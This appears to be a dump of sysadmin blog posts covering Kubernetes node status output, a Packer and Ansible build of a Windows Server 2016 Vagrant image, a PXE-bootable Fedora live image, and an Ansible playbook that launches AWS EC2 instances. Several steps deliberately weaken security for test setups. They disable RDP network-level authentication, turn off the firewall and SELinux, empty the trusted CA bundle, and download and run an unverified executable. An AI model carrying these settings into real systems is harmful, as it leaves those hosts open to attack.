kubelet, kube02 Node kube02 status is now: NodeHasSufficientMemory Normal NodeHasNoDiskPressure 12m (x7 over 12m) kubelet, kube02 Node kube02 status is now: NodeHasNoDiskPressure Name: kube03 Roles: node Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/hostname=kube03 node-role.kubernetes.io/node=true Annotations: alpha.kubernetes.io/provided-node-ip=192.168.121.183 node.alpha.kubernetes.io/ttl=0 volumes.kubernetes.io/controller-managed-attach-detach=true Taints: &lt;none&gt; CreationTimestamp: Fri, 01 Dec 2017 07:48:18 +0000 Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- OutOfDisk False Fri, 01 Dec 2017 08:00:15 +0000 Fri, 01 Dec 2017 07:48:18 +0000 KubeletHasSufficientDisk kubelet has sufficient disk space available MemoryPressure False Fri, 01 Dec 2017 08:00:15 +0000 Fri, 01 Dec 2017 07:48:18 +0000 KubeletHasSufficientMemory kubelet has sufficient memory available DiskPressure False Fri, 01 Dec 2017 08:00:15 +0000 Fri, 01 Dec 2017 07:48:18 +0000 KubeletHasNoDiskPressure kubelet has no disk pressure Ready True Fri, 01 Dec 2017 08:00:15 +0000 Fri, 01 Dec 2017 07:49:20 +0000 KubeletReady kubelet is posting ready status Addresses: InternalIP: 192.168.121.183 Hostname: kube03 Capacity: cpu: 2 memory: 2048056Ki pods: 110 Allocatable: cpu: 1900m memory: 1695656Ki pods: 110 System Info: Machine ID: b16219f793e6953e4cc3a6375a15800f System UUID: D77B14AC-6257-4B9F-A8B7-20870539CFC3 Boot ID: 7c6a422b-23d5-424a-b41a-76965bdd6e4d Kernel Version: 4.4.0-101-generic OS Image: Ubuntu 16.04.3 LTS Operating System: linux Architecture: amd64 Container Runtime Version: docker://Unknown Kubelet Version: v1.8.3+coreos.0 Kube-Proxy Version: v1.8.3+coreos.0 ExternalID: kube03 Non-terminated Pods: (11 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits --------- ---- ------------ ---------- --------------- ------------- default netchecker-agent-hostnet-qn246 15m (0%) 30m (1%) 64M (3%) 100M (5%) default netchecker-agent-tnhvb 15m (0%) 30m (1%) 64M (3%) 100M (5%) default netchecker-server-77b8944dc-5zrk7 50m (2%) 100m (5%) 64M (3%) 256M (14%) kube-system calico-node-wk69p 150m (7%) 300m (15%) 64M (3%) 500M (28%) kube-system elasticsearch-logging-v1-dbf5df58b-v5987 100m (5%) 1 (52%) 0 (0%) 0 (0%) kube-system fluentd-es-v1.22-g6ckh 100m (5%) 0 (0%) 200Mi (12%) 200Mi (12%) kube-system kibana-logging-649489c8bb-76qgn 100m (5%) 100m (5%) 0 (0%) 0 (0%) kube-system kube-dns-cf9d8c47-2rr88 260m (13%) 0 (0%) 110Mi (6%) 170Mi (10%) kube-system kube-proxy-kube03 150m (7%) 500m (26%) 64M (3%) 2G (115%) kube-system kubedns-autoscaler-86c47697df-jwk6l 20m (1%) 0 (0%) 10Mi (0%) 0 (0%) kube-system nginx-proxy-kube03 25m (1%) 300m (15%) 32M (1%) 512M (29%) Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted.) CPU Requests CPU Limits Memory Requests Memory Limits ------------ ---------- --------------- ------------- 985m (51%) 2360m (124%) 687544320 (39%) 3855973120 (222%) Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Starting 12m kubelet, kube03 Starting kubelet. Normal NodeAllocatableEnforced 12m kubelet, kube03 Updated Node Allocatable limit across pods Normal NodeHasSufficientDisk 12m (x8 over 12m) kubelet, kube03 Node kube03 status is now: NodeHasSufficientDisk Normal NodeHasSufficientMemory 12m (x8 over 12m) kubelet, kube03 Node kube03 status is now: NodeHasSufficientMemory Normal NodeHasNoDiskPressure 12m (x7 over 12m) kubelet, kube03 Node kube03 status is now: NodeHasNoDiskPressure Normal Starting 12m kube-proxy, kube03 Starting kube-proxy. Name: kube04 Roles: node Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/hostname=kube04 node-role.kubernetes.io/node=true Annotations: alpha.kubernetes.io/provided-node-ip=192.168.121.92 node.alpha.kubernetes.io/ttl=0 volumes.kubernetes.io/controller-managed-attach-detach=true Taints: &lt;none&gt; CreationTimestamp: Fri, 01 Dec 2017 07:48:17 +0000 Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- OutOfDisk False Fri, 01 Dec 2017 08:00:12 +0000 Fri, 01 Dec 2017 07:48:17 +0000 KubeletHasSufficientDisk kubelet has sufficient disk space available MemoryPressure False Fri, 01 Dec 2017 08:00:12 +0000 Fri, 01 Dec 2017 07:48:17 +0000 KubeletHasSufficientMemory kubelet has sufficient memory available DiskPressure False Fri, 01 Dec 2017 08:00:12 +0000 Fri, 01 Dec 2017 07:48:17 +0000 KubeletHasNoDiskPressure kubelet has no disk pressure Ready True Fri, 01 Dec 2017 08:00:12 +0000 Fri, 01 Dec 2017 07:49:18 +0000 KubeletReady kubelet is posting ready status Addresses: InternalIP: 192.168.121.92 Hostname: kube04 Capacity: cpu: 2 memory: 2048056Ki pods: 110 Allocatable: cpu: 1900m memory: 1695656Ki pods: 110 System Info: Machine ID: b16219f793e6953e4cc3a6375a15800f System UUID: 6DC8CDBF-7D48-4E25-A6D7-E5803A18A59C Boot ID: 3ea8882e-bf05-4e26-8028-ffa54638e562 Kernel Version: 4.4.0-101-generic OS Image: Ubuntu 16.04.3 LTS Operating System: linux Architecture: amd64 Container Runtime Version: docker://Unknown Kubelet Version: v1.8.3+coreos.0 Kube-Proxy Version: v1.8.3+coreos.0 ExternalID: kube04 Non-terminated Pods: (10 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits --------- ---- ------------ ---------- --------------- ------------- default netchecker-agent-hostnet-kr6pn 15m (0%) 30m (1%) 64M (3%) 100M (5%) default netchecker-agent-mtqnz 15m (0%) 30m (1%) 64M (3%) 100M (5%) kube-system calico-node-2sjrc 150m (7%) 300m (15%) 64M (3%) 500M (28%) kube-system elasticsearch-logging-v1-dbf5df58b-dk9vq 100m (5%) 1 (52%) 0 (0%) 0 (0%) kube-system fluentd-es-v1.22-kg6zc 100m (5%) 0 (0%) 200Mi (12%) 200Mi (12%) kube-system kube-dns-cf9d8c47-qkp4j 260m (13%) 0 (0%) 110Mi (6%) 170Mi (10%) kube-system kube-proxy-kube04 150m (7%) 500m (26%) 64M (3%) 2G (115%) kube-system kubernetes-dashboard-7fd45476f8-fl9sj 50m (2%) 100m (5%) 64M (3%) 256M (14%) kube-system nginx-proxy-kube04 25m (1%) 300m (15%) 32M (1%) 512M (29%) kube-system tiller-deploy-546cf9696c-x9pgt 0 (0%) 0 (0%) 0 (0%) 0 (0%) Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted.) CPU Requests CPU Limits Memory Requests Memory Limits ------------ ---------- --------------- ------------- 865m (45%) 2260m (118%) 677058560 (38%) 3855973120 (222%) Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Starting 12m kubelet, kube04 Starting kubelet. Normal NodeAllocatableEnforced 12m kubelet, kube04 Updated Node Allocatable limit across pods Normal NodeHasSufficientDisk 12m (x8 over 12m) kubelet, kube04 Node kube04 status is now: NodeHasSufficientDisk Normal NodeHasSufficientMemory 12m (x8 over 12m) kubelet, kube04 Node kube04 status is now: NodeHasSufficientMemory Normal NodeHasNoDiskPressure 12m (x7 over 12m) kubelet, kube04 Node kube04 status is now: NodeHasNoDiskPressure Then you can work with the Kubernetes Cluster like usual… You can see the whole installation here: Some parts mentioned above are specific to Fedora 26, but most of it can be achievable on the other distros. Enjoy ;-)" }, { "title": "Create Windows image using Packer and Ansible and then run it in Vagrant (libvirt)", "url": "/posts/create-windows-image-using-packer-and-ansible-and-then-run-it-in-vagrant-libvirt/", "categories": "Virtualization, DevOps, linux.xvx.cz", "tags": "packer, ansible, vagrant, kvm, windows", "date": "2017-10-24 00:00:00 +0200", "content": "Original post from linux.xvx.cz I saw many Packer templates which are used to build the Windows images on Github. Almost all of them are using PowerShell scripts or DOS-style batch files. Ansible can use WinRM to manage Windows for some time - therefore I decided to use it also with Packer when building the images. Because of the bug it was not possible to use Ansible 2.3 (or older) with Packer + WinRM. The latest Ansible 2.4 is working fine with Packer + Qemu + WinRM when you want to create the Windows images: https://www.packer.io/docs/provisioners/ansible.html#winrm-communicator Let’s see how you can do it in Fedora 26: Packer + with WinRM communicator / Ansible / Qemu and enable Packer’s Winrm communicator # Install necessary packages dnf install -y -q ansible qemu-img qemu-kvm wget unzip # Download and unpack Packer cd /tmp || exit wget https://releases.hashicorp.com/packer/1.1.3/packer_1.1.3_linux_amd64.zip unzip packer*.zip # Use packerio as a binary name, because packer binary already exists in fedora : /usr/sbin/packer as part of cracklib-dicts package mv packer /usr/local/bin/packerio # Install WinRM communicator for Packer (https://www.packer.io/docs/provisioners/ansible.html#winrm-communicator) mkdir -p ~/.ansible/plugins/connection_plugins wget -P ~/.ansible/plugins/connection_plugins/ https://raw.githubusercontent.com/hashicorp/packer/master/test/fixtures/provisioner-ansible/connection_plugins/packer.py sed -i.orig 's@#connection_plugins =.*@connection_plugins = ~/.ansible/plugins/connection_plugins/@' /etc/ansible/ansible.cfg Create the Packer template, Autounattended file for Windows 2016, and a few helper scripts # Prepare directory structure mkdir -p /var/tmp/packer_windows-server-2016-eval/{scripts/win-common,http/windows-server-2016,ansible} cd /var/tmp/packer_windows-server-2016-eval || exit # Download Autounattended file for Windows Server 2016 Evaluation wget -c -P http/windows-server-2016 https://raw.githubusercontent.com/ruzickap/packer-templates/master/http/windows-server-2016/Autounattend.xml # Create some basic Ansible playbook for Windows provisioning cat &gt; ansible/win.yml &lt;&lt; EOF --- - hosts: all tasks: - name: Enable Remote Desktop win_regedit: key: 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' value: fDenyTSConnections data: 0 datatype: dword - name: Allow connections from computers running any version of Remote Desktop (less secure) win_regedit: key: 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' value: UserAuthentication data: 0 datatype: dword - name: Allow RDP traffic win_shell: Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\" EOF # Get scripts which helps during Autounattended installation + executed after Ansible wget -c -P scripts/win-common https://raw.githubusercontent.com/ruzickap/packer-templates/master/scripts/win-common/{fixnetwork.ps1,remove_nic.bat} # Get the Packer template wget -c https://raw.githubusercontent.com/ruzickap/packer-templates/master/{windows-server-2016-eval.json,Vagrantfile-windows.template} Download and mount the virtio-win iso and run Packer VIRTIO_WIN_ISO_DIR=$(mktemp -d --suffix=_virtio-win-iso) export VIRTIO_WIN_ISO_DIR export NAME=windows-server-2016-standard-x64-eval export WINDOWS_VERSION=2016 export WINDOWS_TYPE=server export TMPDIR=\"/var/tmp/\" cd /var/tmp/packer_windows-server-2016-eval || exit # Download and mount virtio-win to provide basic virtio Windows drivers wget -c https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/latest-virtio/virtio-win.iso mount -o loop virtio-win.iso \"$VIRTIO_WIN_ISO_DIR\" # Build image with packer /usr/local/bin/packerio build windows-server-2016-eval.json umount \"$VIRTIO_WIN_ISO_DIR\" rmdir \"$VIRTIO_WIN_ISO_DIR\" Complete build log: [root@localhost packer_windows-server-2016-eval]# /usr/local/bin/packerio build windows-server-2016-eval.json windows-server-2016-standard-x64-eval output will be in this color. ==&gt; windows-server-2016-standard-x64-eval: Downloading or copying ISO windows-server-2016-standard-x64-eval: Downloading or copying: http://care.dlservice.microsoft.com/dl/download/1/4/9/149D5452-9B29-4274-B6B3-5361DBDA30BC/14393.0.161119-1705.RS1_REFRESH_SERVER_EVAL_X64FRE_EN-US.ISO ==&gt; windows-server-2016-standard-x64-eval: Creating floppy disk... windows-server-2016-standard-x64-eval: Copying files flatly from floppy_files windows-server-2016-standard-x64-eval: Copying file: http/windows-server-2016/Autounattend.xml windows-server-2016-standard-x64-eval: Copying file: scripts/win-common/fixnetwork.ps1 windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/NetKVM/2k16/amd64/netkvm.cat windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/NetKVM/2k16/amd64/netkvm.inf windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/NetKVM/2k16/amd64/netkvm.sys windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/NetKVM/2k16/amd64/netkvmco.dll windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/qxldod/2k16/amd64/qxldod.cat windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/qxldod/2k16/amd64/qxldod.inf windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/qxldod/2k16/amd64/qxldod.sys windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/viostor/2k16/amd64/viostor.cat windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/viostor/2k16/amd64/viostor.inf windows-server-2016-standard-x64-eval: Copying file: /tmp/tmp.cQYclNvngg_virtio-win-iso/viostor/2k16/amd64/viostor.sys windows-server-2016-standard-x64-eval: Done copying files from floppy_files windows-server-2016-standard-x64-eval: Collecting paths from floppy_dirs windows-server-2016-standard-x64-eval: Resulting paths from floppy_dirs : [] windows-server-2016-standard-x64-eval: Done copying paths from floppy_dirs ==&gt; windows-server-2016-standard-x64-eval: Creating hard drive... ==&gt; windows-server-2016-standard-x64-eval: Found port for communicator (SSH, WinRM, etc): 2518. ==&gt; windows-server-2016-standard-x64-eval: Looking for available port between 5900 and 6000 on 127.0.0.1 ==&gt; windows-server-2016-standard-x64-eval: Starting VM, booting from CD-ROM windows-server-2016-standard-x64-eval: The VM will be run headless, without a GUI. If you want to windows-server-2016-standard-x64-eval: view the screen of the VM, connect via VNC without a password to windows-server-2016-standard-x64-eval: vnc://127.0.0.1:5900 ==&gt; windows-server-2016-standard-x64-eval: Overriding defaults Qemu arguments with QemuArgs... ==&gt; windows-server-2016-standard-x64-eval: Waiting 10s for boot... ==&gt; windows-server-2016-standard-x64-eval: Connecting to VM via VNC ==&gt; windows-server-2016-standard-x64-eval: Typing the boot command over VNC... ==&gt; windows-server-2016-standard-x64-eval: Waiting for WinRM to become available... windows-server-2016-standard-x64-eval: #System.Management.Automation.PSCustomObjectSystem.Object1Preparing modules for first use.0-1-1Completed-1 1Preparing modules for first use.0-1-1Completed-1 ==&gt; windows-server-2016-standard-x64-eval: Connected to WinRM! ==&gt; windows-server-2016-standard-x64-eval: Provisioning with Ansible... ==&gt; windows-server-2016-standard-x64-eval: Executing Ansible: ansible-playbook --extra-vars packer_build_name=windows-server-2016-standard-x64-eval packer_builder_type=qemu -i /var/tmp/packer-provisioner-ansible323552097 /var/tmp/packer_windows-server-2016-eval/ansible/win.yml --private-key /var/tmp/ansible-key225720202 --connection packer --extra-vars ansible_shell_type=powershell ansible_shell_executable=None virtio_driver_directory=2k16 windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: PLAY [all] ********************************************************************* windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: TASK [Gathering Facts] ********************************************************* windows-server-2016-standard-x64-eval: ok: [default] windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: TASK [Enable Remote Desktop] *************************************************** windows-server-2016-standard-x64-eval: ok: [default] windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: TASK [Allow connections from computers running any version of Remote Desktop (less secure)] *** windows-server-2016-standard-x64-eval: ok: [default] windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: TASK [Allow RDP traffic] ******************************************************* windows-server-2016-standard-x64-eval: changed: [default] windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: PLAY RECAP ********************************************************************* windows-server-2016-standard-x64-eval: default : ok=4 changed=1 unreachable=0 failed=0 windows-server-2016-standard-x64-eval: ==&gt; windows-server-2016-standard-x64-eval: Restarting Machine ==&gt; windows-server-2016-standard-x64-eval: Waiting for machine to restart... windows-server-2016-standard-x64-eval: A system shutdown is in progress.(1115) windows-server-2016-standard-x64-eval: #System.Management.Automation.PSCustomObjectSystem.Object1Preparing modules for first use.0-1-1Completed-1 1Preparing modules for first use.0-1-1Completed-1 ==&gt; windows-server-2016-standard-x64-eval: Machine successfully restarted, moving on ==&gt; windows-server-2016-standard-x64-eval: Pausing 1m0s before the next provisioner... ==&gt; windows-server-2016-standard-x64-eval: Uploading scripts/win-common/remove_nic.bat =&gt; c:\\remove_nic.bat ==&gt; windows-server-2016-standard-x64-eval: Gracefully halting virtual machine... windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: C:\\Users\\vagrant&gt;echo \"*** Downloading devcon64.exe from https://github.com/PlagueHO/devcon-choco-package/raw/master/devcon.portable/devcon64.exe\" windows-server-2016-standard-x64-eval: \"*** Downloading devcon64.exe from https://github.com/PlagueHO/devcon-choco-package/raw/master/devcon.portable/devcon64.exe\" windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: C:\\Users\\vagrant&gt;powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('https://github.com/PlagueHO/devcon-choco-package/raw/master/devcon.portable/devcon64.exe', 'c:\\devcon64.exe')\" windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: C:\\Users\\vagrant&gt;echo \"*** Removing the NICs\" windows-server-2016-standard-x64-eval: \"*** Removing the NICs\" windows-server-2016-standard-x64-eval: windows-server-2016-standard-x64-eval: C:\\Users\\vagrant&gt;for /F \"tokens=1 delims=: \" %G in ('c:\\devcon64.exe findall =net | findstr /c:\"Red Hat VirtIO Ethernet Adapter\"') do (c:\\devcon64.exe remove \"@%G\" ) ==&gt; windows-server-2016-standard-x64-eval: Converting hard drive... ==&gt; windows-server-2016-standard-x64-eval: Running post-processor: vagrant ==&gt; windows-server-2016-standard-x64-eval (vagrant): Creating Vagrant box for 'libvirt' provider windows-server-2016-standard-x64-eval (vagrant): Copying from artifact: output-windows-server-2016-standard-x64-eval/packer-windows-server-2016-standard-x64-eval windows-server-2016-standard-x64-eval (vagrant): Using custom Vagrantfile: Vagrantfile-windows.template windows-server-2016-standard-x64-eval (vagrant): Compressing: Vagrantfile windows-server-2016-standard-x64-eval (vagrant): Compressing: box.img windows-server-2016-standard-x64-eval (vagrant): Compressing: metadata.json Build 'windows-server-2016-standard-x64-eval' finished. ==&gt; Builds finished. The artifacts of successful builds are: --&gt; windows-server-2016-standard-x64-eval: 'libvirt' provider box: windows-server-2016-standard-x64-eval-libvirt.box Directory structure after build completed: . ├── ansible │   └── win.yml ├── http │   └── windows-server-2016 │   └── Autounattend.xml ├── packer_cache │   └── 49f719e23c56a779a991c4b4ad1680b8363918cd0bfd9ac6b52697d78a309855.iso ├── scripts │   └── win-common │   ├── fixnetwork.ps1 │   └── remove_nic.bat ├── Vagrantfile-windows.template ├── virtio-win.iso ├── windows-server-2016-eval.json └── windows-server-2016-standard-x64-eval-libvirt.box Necessary files: https://github.com/ruzickap/packer-templates/blob/master/ansible/win.yml https://github.com/ruzickap/packer-templates/blob/master/http/windows-server-2016/Autounattend.xml https://github.com/ruzickap/packer-templates/blob/master/scripts/win-common/fixnetwork.ps1 https://github.com/ruzickap/packer-templates/blob/master/scripts/win-common/remove_nic.bat https://github.com/ruzickap/packer-templates/blob/master/Vagrantfile-windows.template https://github.com/ruzickap/packer-templates/blob/master/windows-server-2016-eval.json This is the real example: More complex example can be found here: https://github.com/ruzickap/packer-templates Enjoy ;-)" }, { "title": "How-to build PXE Fedora 26 live image", "url": "/posts/how-to-build-pxe-fedora-26-live-image/", "categories": "Linux, Networking, linux.xvx.cz", "tags": "pxe", "date": "2017-07-16 00:00:00 +0200", "content": "Original post from linux.xvx.cz Sometimes it may be handy to PXE boot live image (running only in memory) over the network. On this page https://lukas.zapletalovi.com/2016/08/hidden-feature-of-fedora-24-live-pxe-boot.html I found an easy way to boot Fedora Live CD over the network. In my case I prefer to build my own image to reduce the size, because I do not need GUI and many other applications located on Fedora Live CD. Here are a few steps on how to do it using the Lorax project. Prepare kickstart file: #version=DEVEL # Firewall configuration firewall --disabled # Use network installation url --mirrorlist='https://mirrors.fedoraproject.org/mirrorlist?repo=fedora-$releasever&amp;arch=$basearch' # Root password rootpw --plaintext xxxxxxxx # Network information network --bootproto=dhcp --device=link --activate # System authorization information auth --enableshadow --passalgo=sha512 # poweroff after installation shutdown # Keyboard layouts keyboard us # System language lang en_US.UTF-8 # SELinux configuration selinux --disabled # System timezone timezone --ntpservers=ntp.nic.cz --utc Etc/UTC # System bootloader configuration bootloader --timeout=1 --append=\"no_timer_check console=tty1 console=ttyS0,115200n8\" # Partition clearing information zerombr clearpart --all --initlabel --disklabel=msdos # Disk partitioning information part / --size 6000 --fstype ext4 repo --name=my-fedora-updates --mirrorlist=http://mirrors.fedoraproject.org/mirrorlist?repo=updates-released-f$releasever&amp;arch=$basearch #My sshkey --username=root \"ssh-rsa AAAAB3N...kxZaCiM=\" %packages --excludedocs --instLangs=en_US ethtool htop lshw lsof mc nmap #postfix screen strace tcpdump telnet traceroute policycoreutils # this is needed for livemedia-creator dracut-live # this is needed for livemedia-creator selinux-policy-targeted # this is needed for livemedia-creator %end %post ( set -x ################# # Configuration ################# echo \" * setting up systemd\" echo \"DumpCore=no\" &gt;&gt; /etc/systemd/system.conf echo \" * setting up journald\" echo \"Storage=volatile\" &gt;&gt; /etc/systemd/journald.conf echo \"RuntimeMaxUse=15M\" &gt;&gt; /etc/systemd/journald.conf echo \"ForwardToSyslog=no\" &gt;&gt; /etc/systemd/journald.conf echo \"ForwardToConsole=no\" &gt;&gt; /etc/systemd/journald.conf ################# # Minimize ################# # Packages to Remove dnf remove -y audit cracklib-dicts dnf-yum fedora-logos firewalld grubby kbd parted plymouth polkit sssd-client xkeyboard-config echo \" * purge existing SSH host keys\" rm -f /etc/ssh/ssh_host_*key{,.pub} echo \" * remove KMS DRM video drivers\" rm -rf /lib/modules/*/kernel/drivers/gpu/drm /lib/firmware/{amdgpu,radeon} echo \" * remove unused drivers\" rm -rf /lib/modules/*/kernel/{sound,drivers/media,fs/nls} echo \" * compressing cracklib dictionary\" xz -9 /usr/share/cracklib/pw_dict.pwd echo \" * purging images\" rm -rf /usr/share/backgrounds/* /usr/share/kde4/* /usr/share/anaconda/pixmaps/rnotes/* echo \" * truncating various logfiles\" for log in dnf.log dracut.log lastlog; do truncate -c -s 0 /var/log/${log} done echo \" * removing trusted CA certificates\" truncate -s0 /usr/share/pki/ca-trust-source/ca-bundle.trust.crt update-ca-trust echo \" * cleaning up dnf cache\" dnf clean all # no more python loading after this step echo \" * removing python precompiled *.pyc files\" find /usr/lib64/python*/ /usr/lib/python*/ -name '*py[co]' -print0 | xargs -0 rm -f echo \" * remove login banner\" rm /etc/issue ) &amp;&gt; /root/ks.out %end Run the “livemedia-creator”: # livemedia-creator --make-pxe-live --live-rootfs-keep-size --image-name=my_fedora_img --tmp=/var/tmp/a --ks fedora26-my.ks --iso=/home/ruzickap/data2/iso/Fedora-Workstation-netinst-x86_64-26-1.5.iso --resultdir=/var/tmp/a/result /usr/lib64/python3.5/optparse.py:999: PendingDeprecationWarning: The KSOption class is deprecated and will be removed in pykickstart-3. Use the argparse module instead. option = self.option_class(*args, **kwargs) 2017-07-16 08:12:28,922: disk_img = /var/tmp/a/result/my_fedora_img 2017-07-16 08:12:28,923: Using disk size of 6002MiB 2017-07-16 08:12:28,923: install_log = /var/tmp/lorax/virt-install.log 2017-07-16 08:12:29,161: qemu vnc=127.0.0.1:0 2017-07-16 08:12:29,161: Running qemu 2017-07-16 08:12:29,286: Processing logs from ('127.0.0.1', 52518) 2017-07-16 08:40:25,126: Installation finished without errors. 2017-07-16 08:40:25,127: Shutting down log processing 2017-07-16 08:40:25,129: unmounting the iso 2017-07-16 08:40:25,173: Disk Image install successful 2017-07-16 08:40:25,173: working dir is /var/tmp/a/lmc-work-9vn7o48e 2017-07-16 08:40:25,798: Partition mounted on /var/tmp/a/tmpfs0l52ph size=6291456000 2017-07-16 08:40:25,798: Creating live rootfs image 2017-07-16 08:41:15,402: Packing live rootfs image 2017-07-16 08:46:31,544: Rebuilding initramfs for live 2017-07-16 08:46:31,607: dracut args = ['--xz', '--add', 'livenet dmsquash-live convertfs pollcdrom qemu qemu-net', '--omit', 'plymouth', '--no-hostonly', '--debug', '--no-early-microcode'] 2017-07-16 08:46:31,653: rebuilding initramfs-4.11.9-300.fc26.x86_64.img 2017-07-16 08:47:42,530: SUMMARY 2017-07-16 08:47:42,530: ------- 2017-07-16 08:47:42,530: Logs are in /var/tmp/lorax 2017-07-16 08:47:42,531: Disk image is at /var/tmp/a/result/my_fedora_img 2017-07-16 08:47:42,531: Results are in /var/tmp/a/result Then you should see the following file in /var/tmp/a directory: $ find /var/tmp/a /var/tmp/a /var/tmp/a/result /var/tmp/a/result/my_fedora_img /var/tmp/a/result/live-rootfs.squashfs.img /var/tmp/a/result/initramfs-4.11.9-300.fc26.x86_64.img /var/tmp/a/result/vmlinuz-4.11.9-300.fc26.x86_64 /var/tmp/a/result/PXE_CONFIG $ cat /var/tmp/a/result/PXE_CONFIG # PXE configuration template generated by livemedia-creator kernel &lt;PXE_DIR&gt;/vmlinuz-4.11.9-300.fc26.x86_64 append initrd=&lt;PXE_DIR&gt;/initramfs-4.11.9-300.fc26.x86_64.img root=live:&lt;URL&gt;/live-rootfs.squashfs.img Then you can use the vmlinuz, initramfs and squashfs.img files and put them to your TFTP server. Once you configure your TFTP + DHCP server properly you should be able to “PXE boot” these files. You can find some more details here as well: https://github.com/theforeman/foreman-discovery-image What I like on this solution is, that everything on the client side is running in the memory - so it doesn’t matter what you have on the disk. Enjoy :-)" }, { "title": "Use Ansible to create and tag Instances in AWS (EC2)", "url": "/posts/use-ansible-to-create-and-tag-instances-in-aws-ec2/", "categories": "Cloud, DevOps, linux.xvx.cz", "tags": "ec2, ansible", "date": "2017-02-16 00:00:00 +0100", "content": "Original post from linux.xvx.cz It may be handy to quickly create a few instances for testing in AWS. For such a case I’m using a simple Ansible playbook which can deploy a few CentOS 7 instances, configure disks, tags volumes and instances and install public ssh key to root for example. AWS Console Here is the playbook: --- - name: Create Instance in AWS hosts: localhost connection: local gather_facts: false vars: aws_access_key: \"xxxxxx\" aws_secret_key: \"xxxxxx\" security_token: \"xxxxxx\" aws_instance_type: \"t2.nano\" aws_region: \"us-east-1\" aws_security_group: \"All Ports\" aws_ami_owner: \"099720109477\" aws_key_name: \"ruzickap\" aws_instance_initiated_shutdown_behavior: \"terminate\" aws_instances_count: 3 site_name: \"ruzickap-test\" aws_tags: Name: \"{{ site_name }}\" Application: \"{{ site_name }}\" Environment: \"Development\" Costcenter: \"1xxxxxxx3\" Division: \"My\" Consumer: \"petr.ruzicka@gmail.com\" tasks: - name: Search for the latest CentOS AMI shell: aws ec2 describe-images --region {{ aws_region }} --owners aws-marketplace --output text --filters \"Name=product-code,Values=aw0evgkw8e5c1q413zgy5pjce\" \"Name=virtualization-type,Values=hvm\" --query 'sort_by(Images, &amp;CreationDate)[-1].[ImageId]' --output 'text' changed_when: False register: centos_ami_id - name: Get Private Subnets in VPC ec2_vpc_subnet_facts: aws_access_key: \"{{ ec2_access_key }}\" aws_secret_key: \"{{ ec2_secret_key }}\" security_token: \"{{ access_token }}\" region: \"{{ aws_region }}\" filters: \"tag:Type\": Private register: ec2_vpc_subnet_facts - debug: \"msg='name: {{ ec2_vpc_subnet_facts.subnets[0].tags.Name }} | subnet_id: {{ ec2_vpc_subnet_facts.subnets[0].id }} | cidr_block: {{ ec2_vpc_subnet_facts.subnets[0].cidr_block }} | region: {{ aws_region }}'\" - name: Create an EC2 instance ec2: aws_access_key: \"{{ ec2_access_key }}\" aws_secret_key: \"{{ ec2_secret_key }}\" security_token: \"{{ access_token }}\" region: \"{{ aws_region }}\" key_name: \"{{ aws_key_name }}\" instance_type: \"{{ aws_instance_type }}\" image: \"{{ centos_ami_id.stdout }}\" instance_tags: \"{{ aws_tags }}\" user_data: | #!/bin/bash echo \"Defaults:centos !requiretty\" &gt; /etc/sudoers.d/disable_requiretty yum upgrade -y yum wait: yes exact_count: \"{{ aws_instances_count }}\" count_tag: Application: \"{{ aws_tags.Application }}\" group: \"{{ aws_security_group }}\" vpc_subnet_id: \"{{ ec2_vpc_subnet_facts.subnets[0].id }}\" instance_initiated_shutdown_behavior: \"{{ aws_instance_initiated_shutdown_behavior }}\" volumes: - device_name: /dev/sda1 volume_type: gp2 volume_size: 9 delete_on_termination: true - device_name: /dev/sdb volume_type: standard volume_size: 1 delete_on_termination: true register: ec2_instances - block: - name: Set name tag for AWS instances ec2_tag: aws_access_key: \"{{ ec2_access_key }}\" aws_secret_key: \"{{ ec2_secret_key }}\" security_token: \"{{ access_token }}\" region: \"{{ aws_region }}\" resource: \"{{ item.1.id }}\" tags: Name: \"{{ aws_tags.Name }}-{{ '%02d' | format(item.0 + 1) }}\" with_indexed_items: \"{{ ec2_instances.instances }}\" loop_control: label: \"{{ item.1.id }} - {{ aws_tags.Name }}-{{ '%02d' | format(item.0 + 1) }}\" - name: Get volumes ids ec2_vol: aws_access_key: \"{{ ec2_access_key }}\" aws_secret_key: \"{{ ec2_secret_key }}\" security_token: \"{{ access_token }}\" region: \"{{ aws_region }}\" instance: \"{{ item }}\" state: list with_items: \"{{ ec2_instances.instance_ids }}\" register: ec2_instances_volumes 